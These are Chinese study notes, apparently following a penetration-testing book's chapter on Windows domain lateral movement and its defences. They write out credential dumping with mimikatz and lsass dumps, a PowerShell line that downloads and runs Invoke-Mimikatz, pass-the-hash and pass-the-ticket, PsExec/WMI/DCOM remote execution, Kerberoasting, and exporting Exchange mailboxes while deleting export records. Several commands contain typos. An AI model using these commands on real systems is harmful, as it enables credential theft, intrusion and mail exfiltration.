# 5 域内横向移动分析及防御
## 5.1 常用windows远程连接和相关命令
### 5.1.1 IPC
> internet process connection,共享"命名管道"的资源,是为了实现进程间通信而开放的明明管道
+ ipc$利用条件
> 需目标开启139,445(windows2000)端口\
> 管理员开启了默认共享,如逻辑盘(c$,d$,e$等),和系统目录winnt或者windows(admin$)
```
//建立IPC连接
net use \\192.168.100.190\ipc$ "Admin12345@" /user:administrator
//查看已经建立的IPC连接
net use
```
+ 连接错误原因
> 用户名或者密码错误
> 目标没有打开ipc$默认共享
> 不能成功链接目标139,445端口
> 命令输入错误
|错误号 |说明 |
|----|----|
|5 |拒绝访问 |
|51 |windows无法找到网络路径,及网络中存在问题|
|53 |找不到网络路径,包括IP地址错误,目标未开机,目标的lanmanserver服务未启动,目标有防火墙(端口过滤)|
|67 |找不到网络名,包括lanmanworkstation服务未启动,ipc$已被删除|
|1219 |提供的凭据与已存在的凭据集冲突,例如:已经和目标建立了ipc$,需要在删除原连接后重新进行连接|
|1326 |未知名的用户名或密码错误|
|1792 |试图登录,但是网络登录服务没有启动,包括目标NetLogon服务未启动(连接域控制器时会出现此情况)|
|2242 |此用户的密码已经过期,例如目标机器设置了帐号管理策略,强制用户定期修改密码|
### 5.1.2 使用windows自带的工具获取远程主机信息
> ipc$连接成功个后可以使用
+ dir
`dir \\ip\c$`
+ tasklist
`tasklist /S ip /u 用户名 /P 密码`
### 5.1.3 计划任务
+ at
> windows2008之前
> IPC$连接成功后
```cmd
//查看目标系统时间
net time \\ip
//复制文件到远程目标主机
copy 1.exe \\ip\c$`
//创建计划任务
at \\ip 4:11PM c:\1.exe`
//清除at记录
at \\ip /delete
//下面的命令先将执行结果写入本地文件,再使用type命令远程读取
at \\ip 4:11PM cmd.exe /c "ipconfig > c:\ip.txt"
type \\ip\c$\ip.txt
```
+ schtasks
> windows vista,2008及之后的版本
> 会在远程计算机C:\WINDOWS\TASK\SCHEDLGU.TXT留下日志,若执行schtasks命令后没有回显,可以net use 然后tpye此文件查看执行结果
```cmd
//在建立IPC$连接的远程主机上创建名为"test"的计划任务,开机时启动,启动C盘下的calc.bat文件,启动权限为system
schtasks /create /s ip /tn test /sc instart /tr c:\calc.bat /ru system /f
//若未建立IPC$连接,可使用 /u 用户名 /p 密码参数
//运行该计划任务
schtasks .run /s ip /i /tn "test"
//删除计划任务  /f 强制删除
schtasks /delete /s ip /tn "test" /f
//删除IPC$连接
net use 名称 /del /y
```
## 5.2 windows系统散列值获取分析与防范
### 5.2.1 LM Hash和NTLM Hash(216页)
### 5.2.2 单机密码抓取与防范
> system权限
+ GetPass
直接运行
+ PwDump7
直接运行
+ QuarksPwDump
`QuarksPwDump.exe --dump-hash-local`
+ 通过SAM和system文件抓取密码
    + 导出SAM和system文件
	```cmd
	reg save hklm\sam sam.hive
	reg save hklm\system system.hive
	```
    + 通过读取SAM和system文件获得NTLM Hash
	```cmd
	//mimikatz
	lsadump::sam /sam:sam.hive /system:system.hive
	```
    + 使用cain读取SAM文件
选择"Import Hashes From a SAM database"选项
    + 使用mimikatz直接读取本地SAM文件,导出hash信息
    ```cmd
    //提升权限
    privilege::dubug
    //将权限提升至system
    token::elevate
    //读取本地SAM获取NTLM Hash
    lasdump::sam
    ```
+ 使用mimikatz在选读取SAM文件
`mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"`
+ 使用mimikatz离线读取lsass.dmp文件
    1. 导出lsass.dmp文件
        + 使用任务管理器到处lsass.dmp
        启动任务管理器,找到lsass.exe进程->右键,选择"create dump file"
		+ 使用procdump导出lsass.dmp
		`procdump.exe -accepteula -ma lsass.exe lsass.dmp`
	2. 使用mimikatz导出lsass.dmp文件中的密码散列值
	```cmd
	//命令行中运行mimikatz,加载lsass.dmp文件
	sekurlsa::minidump lsass.DMP
	//如果看到:"swith to MINIDUMP"字样,表示加载成功
	//导出密码散列值
	sekurlsa::logonPasswords full
	```
+ 使用powershell对散列值进行dump操作
```powershell
//Nishang
import-module .\Get-PassHashes.ps1
```
+ 使用powershell远程加载mimikatz抓取散列值和明文密码
`powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz`
+ 单击密码抓取的防范方法(223页)
	+ windows2012及以上版本默认关闭wdigest,无法从内存中获取明文密码,可以通过修改注册表的方式,再服务器下次重启之后获取(223页)
	+ windows2012以下,安装KB2871997补丁,无法获取明文密码
	1. CMD
	```cmd
	//开启wdigest auth
	reg add \hklm\system\currentcontrolset\control\securityproviders\wdigest /v uselogoncredential /t REG_DWORD /d 1 /f
	//关闭wdigest auth
	reg add \hklm\system\currentcontrolset\control\securityproviders\wdigest /v uselogoncredential /t REG_DWORD /d 0 /f
	```
	2. powershell
	```powershell
	//开启wdigest auth
	set-itemproperty -path hklm:\system\currentcontrolset\control\securityproviders\wdigest -Name uselogoncredential -Type DWORD -Value 1
	//关闭wdigest auth
	set-itemproperty -path hklm:\system\currentcontrolset\control\securityproviders\wdigest -Name uselogoncredential -Type DWORD -Value 0
	```
### 5.2.3 使用Hashcat获取密码(224页)
### 5.2.4 如何防范攻击者抓取明文密码和散列值
+ 设置Active Directory 2012 R2功能级别
> windows server 2012 R2新增了一个名为"受保护的用户"(Protected Users)的用户组,只需要将需要保护的用户放入该组,攻击者就无法使用mimikatz等工具抓取明文密码和散列值
+ 安装KB2871997
> 此补丁是微软用来解决psexec或者IPC远程查看(C$)问题的补丁,能使本地帐号不再被允许远程接入计算机系统,但系统默认的本地管理员帐号administrato这个SID为500的用户列外--即使将administrato改名,该帐号的SID仍为500,攻击者仍然可以使用横向攻击方法获取内网中其他计算机的控制权,安装KB2871997后,仍需禁用默认的administrato帐号,以防止哈希传递攻击
+ 通过修改注册表禁止在内存中存储明文密码
```cmd
//在注册表中添加一个键值,将其设置为0
reg add \hklm\system\currentcontrolset\control\securityproviders\wdigest /v uselogoncredential /t REG_DWORD /d 0
//查询
reg query \hklm\system\currentcontrolset\control\securityproviders\wdigest /v uselogoncredential
```
+ 防御mimikatz攻击(231页)
> mimikatz 在抓取散列值或明文密码时需要Debug权限,将拥有Debug权限的本地管理员从administrato组中删除,重启即可
## 5.3 哈希传递攻击分析与防范
### 5.3.1 哈希传递攻击的概念(231页)
> windows server 2012 R2及之后的版本,默认在内存中不会记录明文密码
### 5.3.2 哈希传递攻击分析
+ mimikatz
> dir后跟要使用的主机名,而不是IP,否则会提示用户名或密码错误
> AES-128密钥也可以用来进行哈希传递
> 使用AES密钥对远程主机进行哈系传递的前提是在本地安装KB2871997
> 如果安装了KB2871997,仍然可以使用SID为500的用户的NTLM Hash进行哈希传递
> mimikatz需要运行在本地管理球员权限下
	+ 使用NTLM Hash进行哈希传递
	```cmd
	privilege::debug
	sekurlsa::pth /user:用户名 /domain:域名 /ntlm:NTLMHash
	//查看DC的共享文件夹
	dir \\dc\c$
	```
	+ 使用AES-256密钥进行哈系传递(pass the key)
	> 远程系统需安装KB2871997补丁
	```cmd
	//使用mimikatz抓取AES-256密钥
	privilege::debug
	sekurlsa::ekeys
	//导入
	privilege::debug
	sekurlsa::pth /user:用户名 /domain:域名 /aes256:AES256密钥
	//查看DC的共享文件夹
	dir \\dc\c$
	```
### 5.3.3 更新KB2871997补丁产生的影响
> 2014年5月发布的KB2871997,该补丁禁止通过本地管理员权限与远程计算机进行连接,其后果就是无法通过本地管理员权限对远程计算机使用psexec,wmi,smbexec,schtasks.at,也无法访问远程主机的文件共享等
> KB2871997无法使用常规的哈希传递方法进行横向移动,但是administrato(SID为500)例外
## 5.4 票据传递攻击分析与防范
> 票据传递 - pass the ticket  - PTT
> dir命令时,使用主机名,如果使用IP地址,会导致错误
> 票据文件注入内存的默认有效时间为10小时
> 在目标机器上不需要本地管理员权限即可进行票据传递
> mimikatz提供的不需要本地管理员权限的横向渗透测试方法
### 5.4.1 使用mimikatz进行票据传递
```cmd
//将内存中的票据导出,会在当前目录下出多个服务票据文件,如krbtgt,cifs,ldap等
mimikatz "privilege::debug" "sekurlsa::tickets /export"
//清理内存中的票据
kerberos::purge
//将票据文件注入内存(就是三个双引号)
mimikatz "kerberos::ptt "票据文件"
//列出远程计算机文件目录
dir \\dc\c$
```
### 5.4.2 使用kekeo进行票据传递
+ kekeo
https://github.com/gentilkiwi/kekeo
```cmd
//在目标机器中运行kekeo,会在当前目录下生成一个票据文件
kekeo "tgt::ask /user:用户名 /domain:域名 /ntlm:NTLMHash"
//清除当前内存中的其他票据
kerkeros::purge
//使用winddows自带命令清除内存中的票价
klist purge
//使用kekeo将票据文件导入内存
kerkeros::ptt 票据文件
//导入完成后,推出kekeo
exit
//列出远程主机的文件
dir \\dc\c$
```
## 5.5 PsExec的使用
> syslnternals套件中的一款软件,windows出品
> 可以在windows vista/NT4.0/2000/XP/2003/2008/2012/2016上运行(32/64位)
### 5.5.1 PsTools工具包中的PsExec
+ 原理
通过管道在远程目标机器上创建一个psexec服务,并在本地磁盘中生成一个名为"PSEXESVC"的二进制文件,然后通过psexec服务运行命令,运行结束后删除服务
|参数 |说明 |
|----|----|
|-accepteula |第一次运行psexec会弹出确认框,使用该参数就不会弹出确认框|
|-s |以system权限运行远程进程,获取一个system权限的交互式shell,如果不使用该参数,会获得一个administrato权限的shell|
|-u |域\用户名|
|-p |密码|
```cmd
//在建立ipc$的情况下,获得system权限的交互式shell
psexec.exe -accepteula \\ip -s cmd.exe
//在建立ipc$的情况下,获取一个administrator权限的交互式shell
psexec.exe -accepteula \\ip cmd.exe
//没有ipc$的情况下,获取一个administrator权限的交互式shell
psexec.exe \\ip -u administrator -u Aa123456@ cmd.exe
//使用psexec在远程计算机上进行回显
psexec.exe \\ip -u administrator -u Aa123456@ cmd.exe /c "ipconfig"
```
> 需要远程系统开启admin$共享(默认是开启的)
> 在使用ipc$连接目标系统后,不需要输入帐号和密码
> 使用psexec执行远程命令时,会在目标系统中创建一个psexec服务,命令执行后会被自动删除,在创建或者删除服务时会产生大量的日志
> 使用psexec可以直接获得system权限的交互式shell
### 5.5.2 metasploit中的psexec模块
```
exploit/windows/smb/psexec
//powershell版
exploit/windows/smb/psexec_psh
```
## 5.6 WMI的使用
> windows management instrumentation windows98开始都支持
> 默认不会将wmi操作记录在日志中
> wmic命令没有回显,需要使用ipc$和type命令读取信息(或者其它方法)
> 远程计算机需要启动windows management instrumentation服务(开放135端口)
### 5.6.1 基本命令
```cmd
//使用目标系统的cmd执行一条命令,并将结果保存在C盘的ip.txt文件中
wmic /node:ip /user:用户名 /password:Aa123456@ process call create "cmd.exe /c ipconfig > ip.txt"
//建立ipc$连接后使用type读取文件内容
type \\ip\c$\ip.txt
```
### 5.6.2 impacket工具包中的wmiexec
> linux向windows进行横向渗透时使用
`wmiexec.py 用户名:密码@ip`
### 5.6.3 wmiexec.vbs
> wmiexec.vbs通过vbs调用wmi来模拟pswxwc功能
> 可在远程系统中执行命令并进行回显,获得远程主机的半交互式shell
> 运行时间较长的命令(ping,system等),需要添加"-wait 5000"或者更长时间的参数
> 运行nc等不需要输出结果但是需要一直运行的进程时,如果使用"-persist"参数,就不需要使用taskkill命令来远程结束进程了
> 部分软件已经开始查杀了
```cmd
//获得半交互式shell
cscript.exe //nologo wmiexec.vbs /shell ip 用户名 密码
//执行单条命令
cscript.exe wmiexec.vbs /cmd ip 用户名 密码 "ipconfig"
```
### 5.6.4 Invoke-WmiCommand
+ powersploit
> 通过powershell调用wmi来远程执行命令
```powershell
//将powersploit中的Invoke-WmiCommand.ps1导入系统,在powershell命令行环境中输入如下命令
//设置目标系统用户名
$user = "域名\用户名"
//设置目标系统密码
$Password = ConvertTo-secureString -String "Aa123456@" -AsPlainText -Force
//将帐号和密码整合起来,以便导入credential
$Cred = New-Object -TypeName system.Management.Automation.PSCredential -ArgumentList $User , $Password
//远程执行命令
$Remote=Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName ip
//将执行结果输出到屏幕上
$Remote.PayloadOutput
```
### 5.6.5 Invoke-WMIMethod
> powershell自带的Invoke-WMIMethod,可以在远程系统中执行命令和指定程序
```powershell
//在powershell命令行环境中执行如下命令,可以以非交互式的方式执行命令,但不会回显执行结果
//设置目标系统用户名
$user = "域名\用户名"
//设置目标系统密码
$Password = ConvertTo-secureString -String "Aa123456@" -AsPlainText -Force
//将帐号和密码整合起来,以便导入credential
$Cred = New-Object -TypeName system.Management.Automation.PSCredential -ArgumentList $User , $Password
//在远程系统中运行"计算器"程序
Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList "calc.exe" -ComputerName "ip" -Credential $Cred
```
## 5.7 永恒之蓝漏洞分析与防范(247页)
## 5.8 smbexec的使用
> smbexec可以通过文件共享(admin$,c$,d$,ipc$)在远程系统中执行命令
### 5.8.1 C++版smbexec
+ 工具说明
	+ test.exe 客户端住程序
	+ execserver.exe 目标系统中的辅助程序
常见的smbexec命令如下
`test.exe ipaddress username password command netshare`
+ 使用方法
> 将execserver.exe上传到目标系统的C:\windows\目录下
> 解除UAC对命令执行的限制
> ipc$连接
> 已被多个杀毒软件查杀
```cmd
//建立IPC$连接
net use \\ip "密码" /user:域名\用户名
test.exe ip 用户名 密码 whoami c$
```
### 5.8.2 impacket工具包中的smbexec.py
```
smbexec.py
//若密码中有@,需要将IP地址前的@转义  Aa123456@\@ip
smbexec.py 域名/用户名:密码@IP
```
### 5.8.3 Linux跨WIndows远程执行命令
+ smbexec(252页)
	+ 工具安装
	```
	git clone https://github.com/Al1ex/smbexec.git
	chmod +x install.sh && ./install.sh
	//运行
	smbexec
	```
	+ 工具说明(254页)
## 5.9 DCOM在远程系统中的使用
> DCOM(分布式组建对象模型)是微软的一系列概念和程序接口,通过DCOM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求
### 5.9.1 通过本地DCOM执行命令
+ 获取DCOM程序列表
	+ powershell
	1. windows2012+
	> Get-CimInstance默认只在powershell3.0以上版本中存在,也就是说只有windows2012及以上才可以使用
	```
	Get-CimInstance Win32_DCOMApplication
	```
	2. windows7,2008
	> 默认powershell2.0
	```
	Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
	```
+ 使用DCOM执行任意命令
```powershell
//本地以管理员权限启动powershell
$com = [acrivator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application",127.0.0.1))
//以当前会话执行administrato权限的calc.exe
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")
```
### 5.9.2 使用dcom在远程计算机上执行命令
> 适用于windows7-10,2008-2016
+ 建立与目标计算机的IPC$连接
`net use \\ip "密码" /user:域名\用户`
+ 执行命令
	1. 调用MMC20.Application远程执行命令
	```poeweshell
	$com = 			[acrivator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application",目标IP))
	//以当前会话执行administrato权限的calc.exe
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c calc.exe","Minimzed")
	```
	2. 调用9BA05972-F6A8-11CF-A442-00A0C90A8F39
	```powershell
	$com = [type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"目标IP")
	$obj = [System.Activator]::VreateInstance($com)
	$item = $obj.item()
	$item.Document.Application.ShellExecute("cmd.exe","/c cala.exe","C:\windows\system32",$null,0)
	```
## 5.10 SPN在域环境中的应用
### 5.10.1 SPN扫描
+ 相关概念(262页)
SNP命令格式如下
`SPN = serviceclass "/" hostname {":"port} {"/" servicename}`
|参数|是否必选|说明|
|----|----|----|
|serviceclass|必选|服务组件的名称|
|hostname|必选|以"/"与后面的名称分隔,是计算机的FQDN(全限定域名,同时带有计算机名和域名)|
|port|非必选|以冒号分隔,后面的内容为该服务监听的端口号|
|servicename|非必选|一个字符串,可以是服务的专用名称(DN),objectcuid,internet主机名或全限定域名|
+ 常见SNP服务
MSSQL服务的示例代码如下
`MSSQLSvc/computer1.pentest.com:1433`
> MSSQLSvc: 服务组件的名称,此处为MSSQL服务
> computer1.pentest.com: 主机名为computer1,域名为pentest.com
> 1433: 监听的端口为1433
>hostname和port之间的冒号只有在该服务对某端口监听时才会使用
Exchange服务的示例代码
`exchangeMDB/EXCAS01.pentest.com`
RDP服务的示例代码
`TERMSERV/EXCA01.pentest.com`
WSMan/WinRM/PSRemoting服务的示例代码
`WSMAN/EXCAS01.pentest.com`
+ 用于进行SPN扫描的PowerShell脚本
	+ PowerShell-AD-Recon
	1. 利用SPN发现域中所有的MSSQL服务
	```poewrshell
	Impotr-Module .\Discover-PSMSSQLServers.ps1
	Discover-PSMSSQLServers
	```
	2. 扫描域中的所有SPN信息
	```poewrshell
	Impotr-Module .\Discover-PSInterestingServices.ps1
	Discover-PSInterestingServices
	```
	+ setspn
	> windows自带
	列出域中所有SPN信息
	`setspn -T domain -q */*`
### 5.10.2 kerberoast攻击分析与防范(266页)
+ 实验:配置MSSQL服务,破解该服务器票价
	1). 手动为mssql帐号注册APN
	`setspn -A MSSQLSvc/computer1pentest.com:1433 mssql`
	2). 查看用户所对应的SPN
	```cmd
	//查看所有注册的SPN
	setspn -T domain -q */*
	//查看制定用户注册的SPN
	setspn -L pentest.com/mssql
	```
	3). 使用adsiedit.msc查看用户SPN及其它高级属性
	4). 配置指定服务的登录权限
	在活动目录中为用户配置指定服务的登录权限
	`gpedit.msc\Computer Configuration\Windows Settings\Security Settings\LocalPolicies\User Rights Assignment\Log on as a service`
	5). 修改加密类型
	因为kerberos协议的默认加密方式为AES256_HMAC.而通过tgsrepcrack.py无法破解该加密方式,所以,攻击者会通过服务器组策略将加密方式设置为RC4_HMAC_MD5
	`gpedit.msc\Computer Configuration\Windows Settings\Security Settings\LocalPolicies\security Options\Network security: Configure encryption types allowed for kerberos`
	6). 请求SPN Kerberos票据
	```powershell
	Add-Type -AssemblyName System.IdentityModel
	New-Object System.IdenttityModel.Tokens.KerberosRequestor SecurityToken -ArgumentList "MSSQLSvc/computer1.pentest.com"
	```
	7). 导出票据
	在mimikatz中执行如下命令,导出的票据会保存在当前目录下的一个kirbi文件中,其加密方式为RC4_HMAC_MD5
	`kerberos::list /export`
	8). 使用kerberoast脚本离线破解票据对应帐号的NTLM Hash
`python tgsrepcrack.py wordlist.txt mssql.kirbi
+ 防范建议(269页)
## 5.11 Exchang邮件服务器安全防范
### 5.11.1 Exchang邮件服务器介绍
+ 邮件服务器角色介绍(270页)
> 邮箱服务器
> 客户端访问服务器
> 集线传输服务器
> 统一消息服务区
> 边缘传输服务器
+ 客户端/远程访问接口和协议
> OWA
> EAC
> Outlook Anywhere
> MAPI
> Exchang ActiveSync
> Exchang Web Service
### 5.11.2 Exchang服务发现
+ 基于端口扫描发现
`nmap -A -O -sv ip`
+ SPN查询
> exchangRFR
> exchangAB
> exchangMDB
> SMTP
> SmtpSvc
`setspn -T pentest.com -F -Q */*`
### 5.11.3 Exchang的基本操作
> exchang数据的后缀名为 ".edb"
+ 查看邮件数据库
```powershell
//正常的powershell环境中没有直接查看exchang数据库的命令,需要先将exchang管理单元添加到当前会话中(用词可能不对)
add-pssnapin microsoft.exchang*
//使用 -server参数可以在指定服务器上进行查询
Get-MailboxDatabase -server "Exchang1"
//可以指定一个数据库,对其详细信息进行查询,如下命令查询数据库的物理路径
//Mailbox Database 1894576043为Get-MailboxDatabase获取的数据库的名称
Get-MailboxDatabase -Indentity 'Mailbox Database 1894576043' | FOrmat-List Name,EdbFilePath,LogFolderPath
```
+ 获取现有用户的邮件地址
```powershell
//列举exchang中所有的用户及其邮件地址
Get-Mailbox | format-tables Name,WindowsEmailAddress
```
+ 查看指定用户的邮箱使用信息
```powershell
//查看指定用户使用邮箱的空间和最后登录时间
get-mailboxstatistics -identity administrator | select displayname,itemcount,totalitemsize,lastlogontime
```
+ 获取用户邮箱中的邮件数量
```powershell
//获取用户邮箱中的邮件数量及用户的最后登录时间
//此命令还可以列出哪些用户没有使用过exchang邮件系统
Get-Mailbox -resultsize unlimited | get-mailboxstatistics | sort-object totalitemsize -descend
```
### 5.11.4 导出指定的电子邮件
> exchang邮件的文件后缀为 ".pst"
> exchang server 2007 需要使用export-mailbox 命令导出邮件
> exchang server 2010 SP1及以后 ,可使用图形化界面和powershell
> 如果要使用PST格式的邮件文件,需要为能够操作powershell的用户配置邮箱导入/导出权限
+ 配置用户的导入/导出权限
```powershell
//查看有导入/导出权限的用户
Get-ManagementRoleAssignment -role "Mailbox Import Export" | Format-List RoleAssigneeNmae
//添加权限,将administrator用户添加到Mailbox Import Export角色组中,就可以通过powershell导出用户的邮件了
//需要重启exchang服务器才能执行导出操作
New-ManagementRoleAssignment -Name "Import Export_Domain Admin" -User "Administrator" -Role "Mailbox Import Export"
//删除权限(此命令可能不对)
Remove-ManagementRoleAssignment "Import Export_Domain Admin" -Confirm:$false
```
+ 设置网络共享文件夹
> 无论哪种方式导出邮件,都需要将文件放置在UNC(universal naming convention,通用命名规则),类似于"\\hostname\sharename"
开启共享,将C盘的inetpub文件夹设置为任意用户都可以操作的文件夹
`net share inetpub=c:\inetpub /grant:everyone,full`
+ 导出用户的电子邮件
> inbox(收件箱) sentltems(已发送) deleteeditem(已删除) drafts(草稿)
	+ 使用powershell导出
	```powershell
	New-mailboxexportrequest -mailbox administrator -Filepath \\192.168.100.194\inetpub\administrator.pst
	```
	+ 通过图形化界面导出电子邮件(278页)
+ 管理导出请求
> 无论是powershell还是图形化界面导出的电子邮件,在创建导出请求后,都会在exchang中留下相关信息
```powershell
//查看导出请求记录
Get-MailboxExportRequest
//删除指定用户的导出请求记录
Remove-MailboxExportRequest -Indentity Administrator
mailboxexport
//删除所有的导出请求记录
Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest
```